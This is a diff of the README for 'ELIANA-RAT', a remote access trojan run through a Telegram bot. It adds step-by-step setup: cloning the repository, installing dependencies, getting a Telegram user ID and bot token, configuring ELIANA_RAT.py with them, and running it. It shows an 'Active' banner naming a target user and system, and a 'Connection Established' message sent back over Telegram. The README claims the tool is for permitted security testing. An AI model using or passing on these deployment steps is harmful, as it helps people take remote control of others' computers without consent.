@@ -8,18 +8,91 @@ This tool enables security testers with explicit permission to remotely execute 
 
 ⚙️ ELIANA-RAT Setup
 
-# Open the ELIANA_RAT.py 
+🚀 Quick Start
+bash
+# 1. Clone the repository
+git clone https://github.com/Adrilaw/ELIANA-Remote-Access-Trojan.git
 
-# Inside the script, you will see those fields you need to change them to your telegram user id and bot api key:
+# 2. Navigate to the directory
+cd ELIANA-Remote-Access-Trojan
 
+# 3. Install dependencies
+pip install -r requirements.txt
+📋 Setup Instructions
+STEP 1: Get Your Telegram Credentials
+1. Get Your Telegram User ID
+Watch this tutorial: How to Get Telegram User ID
+
+Quick Method:
+
+Open Telegram Web: https://web.telegram.org
+
+Search for "@userinfobot"
+
+Send /start command
+
+Bot will reply with your User ID
+
+Copy the numeric ID (e.g., 85463344)
+
+2. Create a Telegram Bot & Get API Token
+Watch this tutorial: How to Create Telegram Bot
+
+Quick Method:
+
+Open Telegram, search for "@BotFather"
+
+Send /newbot command
+
+Choose a name for your bot (e.g., "MyTestBot")
+
+Choose a username (must end with 'bot', e.g., "mytestbot")
+
+Copy the API Token (e.g., 857228:AAHV9S9dRWQFgBUY9XgUg5Sp5SNY9BNnSKw)
+
+STEP 2: Configure ELIANA_RAT.py
+Open the file in a text editor:
+
+bash
+# Windows
+notepad ELIANA_RAT.py
+
+# Linux/Mac
+nano ELIANA_RAT.py
+Find these lines (around line 4-5):
+
+python
 TELEGRAM_TOKEN = "Bot API Key"
 TELEGRAM_CHAT_ID = "User ID"
+Replace with your credentials:
 
-🎥 How to get your Telegram User ID:
-https://www.youtube.com/watch?v=iq8y9niOe4Y
+python
+TELEGRAM_TOKEN = "Bot Api Key"  # Your Bot API Token
+TELEGRAM_CHAT_ID = "User ID"  # Your User ID
+Example of correct configuration:
 
-🎥 How to create a Telegram Bot (API Token):
-https://www.youtube.com/watch?v=UQrcOj63S2o
+python
+# ==================== CONFIG ====================
+# REPLACE THESE WITH YOUR CREDENTIALS!
+TELEGRAM_TOKEN = "Bot Api Key "
+TELEGRAM_CHAT_ID = "User ID"
+# ===============================================
+STEP 3: Test the RAT
+bash
+# Run the Python script
+python3 ELIANA_RAT.py
+Expected Output:
+
+text
+╔══════════════════════════════════════╗
+║       ELIANA RAT v2.0 - Active       ║
+╠══════════════════════════════════════╣
+║ Target: 5285463344                   ║
+║ User: Administrator                  ║
+║ System: Windows 10                   ║
+╚══════════════════════════════════════╝
+📡 Waiting for commands...
+You should receive a Telegram message: "✅ Connection Established"
 
 
 # 🚀 Features
